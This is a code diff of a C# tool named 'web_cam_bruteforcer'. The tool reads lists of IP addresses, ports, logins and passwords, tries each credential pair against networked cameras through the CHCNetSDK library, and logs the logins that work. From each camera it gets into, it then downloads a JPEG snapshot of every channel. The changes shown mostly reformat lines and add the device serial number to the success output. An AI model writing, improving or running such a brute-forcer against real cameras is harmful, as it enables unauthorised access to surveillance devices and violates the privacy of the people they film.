@@ -44,8 +44,7 @@ namespace web_cam_bruteforcer
             if (!File.Exists(OutputFile))
                 File.Create(OutputFile).Dispose();
 
-            if (!File.Exists(IpsFile) || !File.Exists(PortsFile) || !File.Exists(LoginFile) ||
-                !File.Exists(PasswordFile))
+            if (!File.Exists(IpsFile) || !File.Exists(PortsFile) || !File.Exists(LoginFile) || !File.Exists(PasswordFile))
             {
                 Console.WriteLine("Failed to load data");
                 Console.ReadLine();
@@ -136,17 +135,15 @@ namespace web_cam_bruteforcer
             if (uid != -1)
             {
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("Logged in: " + login + ":" + password + "@" + ip + ":" + port);
+                var sn = System.Text.Encoding.UTF8.GetString(deviceInfo.sSerialNumber);
+                Console.WriteLine("Logged in: " + login + ":" + password + "@" + ip + ":" + port + ", channels: " + deviceInfo.byChanNum + ", SN: " + sn);
                 Console.ResetColor();
                 if (!FastMode)
                 {
                     File.AppendAllText(OutputFile, login + ":" + password + "@" + ip + ":" + port + "\n");
-                    for (int channel = deviceInfo.byStartChan;
-                        channel < deviceInfo.byChanNum + deviceInfo.byStartChan;
-                        channel++)
+                    for (int channel = deviceInfo.byStartChan; channel < deviceInfo.byChanNum + deviceInfo.byStartChan; channel++)
                     {
-                        string filename = PicturesDir + "/" + login + "_" + password + "_" + ip + "_" + port + "_" +
-                                          channel + ".jpg";
+                        string filename = PicturesDir + "/" + login + "_" + password + "_" + ip + "_" + port + "_" + channel + ".jpg";
                         CHCNetSDK.NET_DVR_JPEGPARA netDvrJpegpara = new CHCNetSDK.NET_DVR_JPEGPARA
                         {
                             wPicQuality = 0,
@@ -155,11 +152,8 @@ namespace web_cam_bruteforcer
                         if (CHCNetSDK.NET_DVR_CaptureJPEGPicture(uid, channel, ref netDvrJpegpara, filename))
                         {
                             Image image = Image.FromFile(filename);
-                            string size = image.Width + "x" + image.Height;
                             Console.ForegroundColor = ConsoleColor.Cyan;
-                            Console.WriteLine("Downloaded picture (channel " + channel + ", size " + size +
-                                              ") from the camera " + ip + ":" +
-                                              port);
+                            Console.WriteLine("Downloaded picture (channel " + channel + ", size " + image.Width + "x" + image.Height + ") from the camera " + ip + ":" + port);
                             Console.ResetColor();
                         }
                     }
